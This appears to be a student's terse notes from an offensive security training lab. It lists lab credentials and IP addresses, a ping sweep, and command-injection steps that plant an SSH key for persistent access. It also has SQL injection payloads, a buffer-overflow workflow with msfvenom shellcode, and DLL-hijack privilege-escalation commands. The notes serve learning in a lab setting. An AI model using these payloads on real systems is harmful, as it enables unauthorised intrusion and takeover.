GREYMAN
student@10.50.39.46 9MaGX5PmoRtsLKk
http://10.50.20.250:8000/challenges

linops
10.50.36.67
winops
10.50.26.46
xfreerdp /u:student /v:10.50.26.46 /dynamic-resolution +glyph-cache +clipboard

DRY Run
10.50.34.92

Phase
1: Mission Definitin
2: recon
3: footprinting
4: Exploit
5: post exp
6: Doc misssoin

exploit-db.com
virustotal


# google hacking
site: marines.mil
site: marines.mil covid 19
site: marines.mil filetype:pdf "covid 19"

 
# Recon 
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done

# Web Exploitation

-command injection
(home box)
  ssh-keygen -t rsa
  cat .ssh/id_rsa.pub
(Target)
  ; whoami
  ; cat /ect/passwd
  ; ls -la /var/www
  ; mkdir /var/www/.ssh
  ; echo "id_rsa.pub" > /var/www/.ssh/authorized_keys
  ; cat /var/www/.ssh/authorized_keys
(home)
  ssh www-data@10.50.31.75

  ls -la /var/www/html
  
# sql

mysql
show databases;
show tables from session;
select * from session.car;
use session;
select * from car;
describe car;
select * from car UNION select tireid,name,size,cost,1,2 FROM Tires;
select id FROM users WHERE name='tom'or 1='1' AND pass='tom' or 1='1'

text Box()
ram' OR 1='1

# Reverse Engineering


url()
category=1 or 1=1
UNION SELECT 1,table_name,3 FROM information_schema.tables

# DEV EXPLOIT
gdb 
wiremask 
look for off set for eip 
gdb pdisass main
env - gdb (file)
show env
unset env
run and crash the program
info proc map
find /b (start of heap), (end of stack), 0xff, 0xef
find jump to eip to jum esp
msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python

!mona modules
!mona jmp -r esp -m
/.hidden/inventory.exe <<<$(./mybuff.py)

# priv escalation 
procmon
crl L
path containt dll
-p windows/exec CMD='cmd.exe /C "whoami" > C:\ p\whami.txt' -f dll > sspiclr dll

LINUX


dry run
file upload
/etc/host for another box
a' OR 1='1
find / -name hint* 2> /dev/null
